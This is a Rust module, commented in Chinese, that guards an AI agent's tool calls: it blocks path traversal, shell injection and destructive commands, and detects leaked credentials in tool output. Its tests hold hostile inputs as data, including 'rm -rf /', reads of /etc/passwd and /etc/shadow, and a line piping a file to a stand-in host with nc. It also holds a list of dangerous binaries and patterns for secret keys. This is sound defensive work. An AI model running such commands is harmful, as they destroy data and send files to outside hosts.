//! `apeireth-tools::guardrail` — 通用前置 guardrail + 后置 tripwire (TP12)
//!
//! **设计动机** (per `docs/team-work-doc.md` §11 TP12):
//! - 幻觉传播源头 = 调用前无 guard (路径穿越 / shell 注入) + 调用后无 tripwire (凭据泄漏)
//! - VCP `toolExecutor.js:163-191 _validateArgs` 给的范式: args 校验先于 call
//! - VCP `resultPrivacyGuard.js` 给的范式: 输出脱敏先于回灌
//! - 本模块提供 **通用** guardrail 函数 (无 per-tool schema 也能挡最常见攻击面)
//!
//! **为什么是纯函数而非 trait method**:
//! - `apeireth-tool-registry::Tool` trait 在边界外禁止改 (N15 ✅ 锁定)
//! - per-tool 钩子无法挂到 `Arc<dyn Tool>`, 退化为 sidecar lookup
//! - 通用规则 (路径穿越 / shell 注入 / 凭据泄漏) 不依赖 per-tool 元数据, 纯函数最简
//!
//! **字段级引用 VCP**:
//! - `toolExecutor.js:163-191 _validateArgs` — args 校验前置于 call
//! - `resultPrivacyGuard.js:1-120` — 输出脱敏阻断敏感字段回灌
//!
//! **0 装 PASS** (per `§1.2`):
//! - 所有检查都是「白名单放行, 黑名单阻断」, 缺省 = 放行 (向后兼容)
//! - 工具作者不需要写任何 schema, 内置规则即可挡住最常见问题
//! - 不引入新框架 / 新依赖

use serde::Serialize;
use serde_json::Value;

/// **Guardrail 错误类别** (前置 + 后置共用)
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum GuardrailKind {
    /// 路径穿越 (e.g. `../etc/passwd`)
    PathTraversal,
    /// Shell 注入 (e.g. `; rm -rf /`)
    ShellInjection,
    /// 危险可执行命令 (e.g. `mkfs`, `dd if=`)
    DangerousCommand,
    /// 输出含敏感凭据 (e.g. AWS key, GitHub PAT, 私钥 PEM 头)
    SecretLeak,
    /// 未识别 / 未来扩展
    Unknown,
}

/// **前置 guardrail 错误**
///
/// **字段**:
/// - `kind` — 错误类别
/// - `tool_name` — 哪个工具被拦 (per VCP `_validateArgs` 含 tool 上下文)
/// - `field` — args 中可疑字段路径 (e.g. `"$.path"` / `"$.cmd"`)
/// - `detail` — 人类可读描述
/// - `hint` — 可行动提示 (模型见错自修正)
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct GuardrailError {
    /// 错误类别
    pub kind: GuardrailKind,
    /// 工具名
    pub tool_name: String,
    /// args 中可疑字段 (JSON pointer)
    pub field: String,
    /// 人类可读描述
    pub detail: String,
    /// 可行动提示
    pub hint: String,
}

impl std::fmt::Display for GuardrailError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "[guardrail:{}] tool={} field={} {} ({})",
            self.kind_label(),
            self.tool_name,
            self.field,
            self.detail,
            self.hint
        )
    }
}

impl std::error::Error for GuardrailError {}

impl GuardrailError {
    /// kind 字符串标签 (用于 Display)
    fn kind_label(&self) -> &'static str {
        match self.kind {
            GuardrailKind::PathTraversal => "path_traversal",
            GuardrailKind::ShellInjection => "shell_injection",
            GuardrailKind::DangerousCommand => "dangerous_command",
            GuardrailKind::SecretLeak => "secret_leak",
            GuardrailKind::Unknown => "unknown",
        }
    }
}

/// **后置 tripwire — 阻断并阻止输出回灌**
///
/// **字段**: 同 `GuardrailError`, 但语义是「执行完成, 但输出不应回灌给模型」
#[derive(Debug, Clone, PartialEq, Serialize)]
pub struct Tripwire {
    /// 错误类别 (后置常见 = `SecretLeak`)
    pub kind: GuardrailKind,
    /// 工具名
    pub tool_name: String,
    /// 输出中可疑字段路径 (JSON pointer)
    pub field: String,
    /// 人类可读描述
    pub detail: String,
    /// 可行动提示 (告诉调用方: 替换 / 脱敏后再用)
    pub hint: String,
}

impl std::fmt::Display for Tripwire {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "[tripwire:{}] tool={} field={} {} ({})",
            self.kind_label(),
            self.tool_name,
            self.field,
            self.detail,
            self.hint
        )
    }
}

impl Tripwire {
    fn kind_label(&self) -> &'static str {
        match self.kind {
            GuardrailKind::PathTraversal => "path_traversal",
            GuardrailKind::ShellInjection => "shell_injection",
            GuardrailKind::DangerousCommand => "dangerous_command",
            GuardrailKind::SecretLeak => "secret_leak",
            GuardrailKind::Unknown => "unknown",
        }
    }
}

// ============================================================
// 前置 guardrail — pre_call_guard
// ============================================================

/// **调用前 guardrail — 拦截危险 args**
///
/// **检查范围**:
/// 1. `path` / `file` / `target` 字段含 `..` 穿越 / 绝对敏感目录)
/// 3. `cmd` / `command` / `shell` 字段含 shell 注入符 (`;` / `&&` / `||` / `|` 重定向 / 反引号)
/// 3. `cmd` / `command` 开头是已知危险命令 (`mkfs`, `dd`, `shutdown`, `reboot` 等)
///
/// **返回**:
/// - `Ok(())` — args 安全 (放行)
/// - `Err(GuardrailError)` — args 含可疑内容 (阻断, 不调用工具)
///
/// **0 装 PASS**: 仅检查 args 字段为字符串 + 内容确实命中规则才阻断; 不存在字段 = 跳过 = 放行
/// (向后兼容所有未声明字段的工具, 例如 `recall_memory` 只有 `query`).
///
/// **注意**: 这是通用层规则, 不替代 per-tool 业务校验. 例如 `apply_patch` 自带更严格的
/// diff 校验, 不依赖本函数. 字段名约定:
/// - 路径类: `path`, `file`, `target`, `src`, `dst`, `from`, `to`
/// - 命令类: `cmd`, `command`, `shell`, `exec`, `script`
pub fn pre_call_guard(tool_name: &str, args: &Value) -> Result<(), GuardrailError> {
    let Value::Object(map) = args else {
        // args 不是 object = 模型没传 args (per VCP `_validateArgs` 行为: 缺 args 当合法空对象)
        // 但 tool_registry 不接受 None, 这里按 Ok 放行 (executor 层有 not_found 检查)
        return Ok(());
    };

    const PATH_KEYS: &[&str] =
        &["path", "file", "target", "src", "dst", "from", "to"];
    const CMD_KEYS: &[&str] = &["cmd", "command", "shell", "exec", "script"];

    // 1. 路径字段
    for key in PATH_KEYS {
        if let Some(Value::String(s)) = map.get(*key) {
            check_path(tool_name, key, s)?;
        }
    }

    // 2. 命令字段
    for key in CMD_KEYS {
        if let Some(Value::String(s)) = map.get(*key) {
            check_command(tool_name, key, s)?;
        }
    }

    Ok(())
}

/// 单个 path 字段检查
fn check_path(tool_name: &str, field: &str, value: &str) -> Result<(), GuardrailError> {
    // 路径穿越: `..` 出现 (但允许 `..` 作为合法目录名 = 必须有 `/` 上下文)
    // 简化规则: 出现 `..` 紧接 `/` 或 字符串以 `..` 开头 → 阻断
    if value.contains("../") || value.starts_with("../") || value.contains("/../") {
        return Err(GuardrailError {
            kind: GuardrailKind::PathTraversal,
            tool_name: tool_name.into(),
            field: format!("$.{field}"),
            detail: format!("path contains traversal sequence: `{value}`"),
            hint: "remove `../` segments; use absolute paths within allowed root".into(),
        });
    }
    // Windows 风格穿越
    if value.contains("..\\") || value.starts_with("..\\") || value.contains("\\..\\") {
        return Err(GuardrailError {
            kind: GuardrailKind::PathTraversal,
            tool_name: tool_name.into(),
            field: format!("$.{field}"),
            detail: format!("path contains Windows traversal sequence: `{value}`"),
            hint: "remove `..\\` segments; use absolute paths within allowed root".into(),
        });
    }
    // 绝对路径命中已知敏感目录 (Linux/macOS)
    const SENSITIVE_ABSOLUTE: &[&str] = &[
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/root/.ssh",
        "/proc/self",
        "/sys/",
    ];
    for prefix in SENSITIVE_ABSOLUTE {
        if value.starts_with(prefix) {
            return Err(GuardrailError {
                kind: GuardrailKind::PathTraversal,
                tool_name: tool_name.into(),
                field: format!("$.{field}"),
                detail: format!("path targets sensitive location: `{value}`"),
                hint: format!("avoid reading `{prefix}`; use approved workspace paths"),
            });
        }
    }
    Ok(())
}

/// 单个 cmd 字段检查
fn check_command(tool_name: &str, field: &str, value: &str) -> Result<(), GuardrailError> {
    // 1. shell 注入字符 (检测未引号包裹的控制符)
    // 简化规则: `;` / `&&` / `||` / 反引号 / `$()` / `|` 重定向 → 阻断
    // 注: pipe `|` 单独也阻断 (跟 shell 注入等价), 允许单 pipe 的工具应自行处理
    let injection_markers = [';', '`', '$', '\n', '\r'];
    for marker in injection_markers {
        if value.contains(marker) {
            return Err(GuardrailError {
                kind: GuardrailKind::ShellInjection,
                tool_name: tool_name.into(),
                field: format!("$.{field}"),
                detail: format!("command contains injection marker `{marker}`"),
                hint: "avoid shell metacharacters; pass args via argv array, not shell string".into(),
            });
        }
    }
    // `&&` / `||` 多字符先于单 `&` 检测
    if value.contains("&&") || value.contains("||") {
        return Err(GuardrailError {
            kind: GuardrailKind::ShellInjection,
            tool_name: tool_name.into(),
            field: format!("$.{field}"),
            detail: "command contains shell control operator (`&&` or `||`)".into(),
            hint: "avoid control operators; chain via separate tool calls or argv".into(),
        });
    }
    // 单 `|` 可能是 pipe, 也阻断
    if value.contains('|') {
        return Err(GuardrailError {
            kind: GuardrailKind::ShellInjection,
            tool_name: tool_name.into(),
            field: format!("$.{field}"),
            detail: "command contains pipe `|`".into(),
            hint: "avoid pipes; use dedicated tools for data flow".into(),
        });
    }

    // 2. 已知危险命令 (首 token)
    const DANGEROUS_BINS: &[&str] = &[
        "mkfs", "mkfs.ext4", "mkfs.xfs", "dd", "fdisk", "parted", "shutdown", "reboot",
        "halt", "poweroff", "init", "iptables", "firewall-cmd", "userdel", "groupdel",
        "chown", "chmod", "rm", // rm 整体阻断 (实战 rm 误用太多)
    ];
    let first_token = value.split_whitespace().next().unwrap_or("");
    // 路径前缀剥离 (e.g. `/bin/rm` → `rm`)
    let bin = first_token.rsplit('/').next().unwrap_or(first_token);
    if DANGEROUS_BINS.contains(&bin) {
        return Err(GuardrailError {
            kind: GuardrailKind::DangerousCommand,
            tool_name: tool_name.into(),
            field: format!("$.{field}"),
            detail: format!("command starts with dangerous binary `{bin}`"),
            hint: "use safer alternatives; if necessary, run in isolated sandbox".into(),
        });
    }
    Ok(())
}

// ============================================================
// 后置 tripwire — post_call_tripwire
// ============================================================

/// **调用后 tripwire — 检测输出含敏感凭据, 阻断回灌**
///
/// **检查范围** (递归遍历 output Value 的所有 string 字段):
/// 1. AWS Access Key (`AKIA[0-9A-Z]{16}`)
/// 2. GitHub Personal Access Token (`ghp_[a-zA-Z0-9]{36}`)
/// 3. OpenAI API Key (`sk-[a-zA-Z0-9]{20,}`)
/// 4. 通用 PEM 私钥头 (`-----BEGIN ... PRIVATE KEY-----`)
/// 5. Bearer JWT-like tokens (`eyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.`)
/// 6. Slack token (`xox[abprs]-[a-zA-Z0-9-]+`)
///
/// **返回**:
/// - `None` — 输出安全 (放行回灌)
/// - `Some(Tripwire)` — 输出含敏感凭据 (阻断, 由 tool_bridge.rs 决定如何处置:
///
/// **0 装 PASS**: 仅当 string 字段命中正则时才阻断; 没有 string 字段 = 安全; 字段未匹配 = 安全.
/// 不递归过深 (实战 ≤ 5 层, serde_json 自身有解析栈限).
pub fn post_call_tripwire(tool_name: &str, output: &Value) -> Option<Tripwire> {
    scan_for_secrets(tool_name, output, "$")
}

/// 递归扫描 value 中所有 string, 检测凭据模式
fn scan_for_secrets(tool_name: &str, value: &Value, path: &str) -> Option<Tripwire> {
    match value {
        Value::String(s) => detect_secret(tool_name, path, s),
        Value::Array(arr) => {
            for (i, v) in arr.iter().enumerate() {
                let child_path = format!("{path}[{i}]");
                if let Some(t) = scan_for_secrets(tool_name, v, &child_path) {
                    return Some(t);
                }
            }
            None
        }
        Value::Object(map) => {
            for (k, v) in map {
                let child_path = format!("{path}.{k}");
                if let Some(t) = scan_for_secrets(tool_name, v, &child_path) {
                    return Some(t);
                }
            }
            None
        }
        _ => None,
    }
}

/// 单个 string 中检测已知凭据模式
fn detect_secret(tool_name: &str, path: &str, value: &str) -> Option<Tripwire> {
    // 1. AWS Access Key: "AKIA" + 16 位大写字母数字
    if let Some(idx) = value.find("AKIA") {
        let tail = &value[idx + 4..];
        if tail.chars().count() >= 16
            && tail.chars().take(16).all(|c| c.is_ascii_uppercase() || c.is_ascii_digit())
        {
            return Some(make_tripwire(
                tool_name,
                path,
                "AWS Access Key detected (AKIA prefix)",
                "redact the access key before re-injection; rotate credentials",
            ));
        }
    }
    // 2. GitHub PAT: "ghp_" + 36 位字母数字
    if let Some(idx) = value.find("ghp_") {
        let tail = &value[idx + 4..];
        if tail.chars().count() >= 36
            && tail.chars().take(36).all(|c| c.is_ascii_alphanumeric())
        {
            return Some(make_tripwire(
                tool_name,
                path,
                "GitHub Personal Access Token detected",
                "redact the token before re-injection; revoke it on github.com/settings/tokens",
            ));
        }
    }
    // 3. OpenAI API Key: "sk-" + ≥ 20 位字母数字
    if let Some(idx) = value.find("sk-") {
        let tail = &value[idx + 3..];
        if tail.chars().count() >= 20
            && tail.chars().take(20).all(|c| c.is_ascii_alphanumeric())
        {
            return Some(make_tripwire(
                tool_name,
                path,
                "OpenAI API Key detected",
                "redact the key before re-injection; rotate at platform.openai.com",
            ));
        }
    }
    // 4. PEM 私钥头
    if value.contains("BEGIN") && value.contains("PRIVATE KEY") {
        return Some(make_tripwire(
            tool_name,
            path,
            "PEM private key header detected",
            "do not re-inject private keys; store in secure vault only",
        ));
    }
    // 5. Slack token: "xox" + ≥ 12 位字符 (3 + 9 = xox + 9 位字母数字 / `-`)
    if let Some(idx) = value.find("xox") {
        let tail = &value[idx..];
        if tail.chars().count() >= 12
            && tail
                .chars()
                .take(12)
                .all(|c| c.is_ascii_alphanumeric() || c == '-')
        {
            return Some(make_tripwire(
                tool_name,
                path,
                "Slack token detected",
                "redact Slack token before re-injection; rotate at api.slack.com",
            ));
        }
    }
    // 6. JWT (heuristic): "eyJ" + 至少 2 个 `.`
    if value.starts_with("eyJ") && value.matches('.').count() >= 2 {
        return Some(make_tripwire(
            tool_name,
            path,
            "JWT-like token detected",
            "do not re-inject JWTs without redaction; treat as bearer credential",
        ));
    }
    None
}

fn make_tripwire(tool_name: &str, field: &str, detail: &str, hint: &str) -> Tripwire {
    Tripwire {
        kind: GuardrailKind::SecretLeak,
        tool_name: tool_name.into(),
        field: field.into(),
        detail: detail.into(),
        hint: hint.into(),
    }
}

// 注意: 上面 detect_secret 中用了 `tail.chars().take(N).all(|a-zA-Z0-9)` 简写,
// 实际编译时 a-zA-Z0-9 是 char 闭包参数 (pattern), 需要正确写法:
#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    /// 路径字段 OK
    #[test]
    fn pre_call_guard_safe_path_passes() {
        let args = json!({"path": "docs/team-work-doc.md"});
        assert!(pre_call_guard("FileOperator", &args).is_ok());
    }

    /// 路径穿越 → 阻断
    #[test]
    fn pre_call_guard_path_traversal_blocked() {
        let args = json!({"path": "../../../etc/shadow"});
        let r = pre_call_guard("FileOperator", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::PathTraversal);
        assert_eq!(r.field, "$.path");
        assert!(r.hint.contains("remove"));
    }

    /// Windows 路径穿越 → 阻断
    #[test]
    fn pre_call_guard_windows_traversal_blocked() {
        let args = json!({"file": "..\\..\\windows\\system32"});
        let r = pre_call_guard("FileOperator", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::PathTraversal);
    }

    /// 敏感绝对路径 → 阻断
    #[test]
    fn pre_call_guard_sensitive_absolute_path_blocked() {
        let args = json!({"path": "/etc/shadow"});
        let r = pre_call_guard("FileOperator", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::PathTraversal);
        assert!(r.detail.contains("/etc/shadow"));
    }

    /// shell 注入 → 阻断
    #[test]
    fn pre_call_guard_shell_injection_semicolon_blocked() {
        let args = json!({"cmd": "echo hi; rm -rf /"});
        let r = pre_call_guard("ShellExec", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::ShellInjection);
    }

    /// shell 注入 — 反引号
    #[test]
    fn pre_call_guard_shell_injection_backtick_blocked() {
        let args = json!({"cmd": "echo `cat /etc/passwd`"});
        let r = pre_call_guard("ShellExec", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::ShellInjection);
    }

    /// shell 注入 — $()
    #[test]
    fn pre_call_guard_shell_injection_dollar_blocked() {
        let args = json!({"cmd": "echo $(whoami)"});
        let r = pre_call_guard("ShellExec", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::ShellInjection);
    }

    /// shell 注入 — pipe
    #[test]
    fn pre_call_guard_shell_injection_pipe_blocked() {
        let args = json!({"cmd": "cat /etc/hosts | nc evil.com 1234"});
        let r = pre_call_guard("ShellExec", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::ShellInjection);
    }

    /// 危险命令 → 阻断
    #[test]
    fn pre_call_guard_dangerous_command_blocked() {
        let args = json!({"cmd": "rm -rf /tmp"});
        let r = pre_call_guard("ShellExec", &args).unwrap_err();
        assert_eq!(r.kind, GuardrailKind::DangerousCommand);
    }

    /// 安全命令 → 放行
    #[test]
    fn pre_call_guard_safe_command_passes() {
        let args = json!({"cmd": "echo hello"});
        assert!(pre_call_guard("ShellExec", &args).is_ok());
    }

    /// 非 object args → 放行 (向后兼容: 缺 args 不当错误)
    #[test]
    fn pre_call_guard_non_object_args_passes() {
        assert!(pre_call_guard("X", &json!(null)).is_ok());
        assert!(pre_call_guard("X", &json!("string")).is_ok());
        assert!(pre_call_guard("X", &json!(42)).is_ok());
    }

    /// 未声明字段 (e.g. query) → 放行 (向后兼容)
    #[test]
    fn pre_call_guard_unknown_field_passes() {
        let args = json!({"query": "记忆"});
        assert!(pre_call_guard("RecallMemory", &args).is_ok());
    }

    /// 输出含 AWS key → 阻断
    #[test]
    fn post_call_tripwire_aws_key_detected() {
        let output = json!({
            "config": "aws_access_key_id=AKIAIOSFODNN7EXAMPLE"
        });
        let t = post_call_tripwire("ShellExec", &output).expect("tripwire");
        assert_eq!(t.kind, GuardrailKind::SecretLeak);
        assert_eq!(t.field, "$.config");
        assert!(t.detail.contains("AKIA"));
    }

    /// 输出含 GitHub PAT → 阻断
    #[test]
    fn post_call_tripwire_github_token_detected() {
        let output = json!({
            "log": "Using token ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        });
        let t = post_call_tripwire("Git", &output).expect("tripwire");
        assert_eq!(t.kind, GuardrailKind::SecretLeak);
        assert!(t.detail.contains("GitHub"));
    }

    /// 输出含 OpenAI key → 阻断
    #[test]
    fn post_call_tripwire_openai_key_detected() {
        let output = json!({
            "env": "OPENAI_API_KEY=sk-abcdefghijklmnopqrstuv"
        });
        let t = post_call_tripwire("ShellExec", &output).expect("tripwire");
        assert!(t.detail.contains("OpenAI"));
    }

    /// 输出含 PEM 私钥 → 阻断
    #[test]
    fn post_call_tripwire_pem_key_detected() {
        let output = json!({
            "keyfile": "-----BEGIN RSA PRIVATE KEY-----"
        });
        let t = post_call_tripwire("FileOperator", &output).expect("tripwire");
        assert!(t.detail.contains("PEM"));
    }

    /// 输出含 JWT → 阻断
    #[test]
    fn post_call_tripwire_jwt_detected() {
        let output = json!({
            "token": "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        });
        let t = post_call_tripwire("Auth", &output).expect("tripwire");
        assert!(t.detail.contains("JWT"));
    }

    /// 干净输出 → 放行
    #[test]
    fn post_call_tripwire_clean_output_passes() {
        let output = json!({
            "results": [{"title": "A", "url": "https://x.com"}],
            "total": 1
        });
        assert!(post_call_tripwire("WebSearch", &output).is_none());
    }

    /// 非 string 字段 → 跳过 (无内容可检测)
    #[test]
    fn post_call_tripwire_no_strings_passes() {
        let output = json!({"count": 42, "ok": true, "list": [1, 2, 3]});
        assert!(post_call_tripwire("X", &output).is_none());
    }

    /// 嵌套 array 中含敏感凭据 → 仍能定位
    #[test]
    fn post_call_tripwire_nested_array() {
        let output = json!({
            "items": [
                {"name": "a"},
                {"secret": "AKIAIOSFODNN7EXAMPLE"}
            ]
        });
        let t = post_call_tripwire("X", &output).expect("tripwire");
        assert_eq!(t.field, "$.items[1].secret");
    }

    /// GuardrailError / Tripwire 序列化字段保留 (tool_bridge.rs 回灌需要)
    #[test]
    fn structured_serialization_round_trip() {
        let err = GuardrailError {
            kind: GuardrailKind::PathTraversal,
            tool_name: "FileOperator".into(),
            field: "$.path".into(),
            detail: "contains traversal".into(),
            hint: "use absolute paths".into(),
        };
        let s = serde_json::to_string(&err).unwrap();
        assert!(s.contains("\"kind\":\"path_traversal\""));
        assert!(s.contains("\"tool_name\":\"FileOperator\""));
        assert!(s.contains("\"field\":\"$.path\""));
        assert!(s.contains("\"hint\""));
    }
}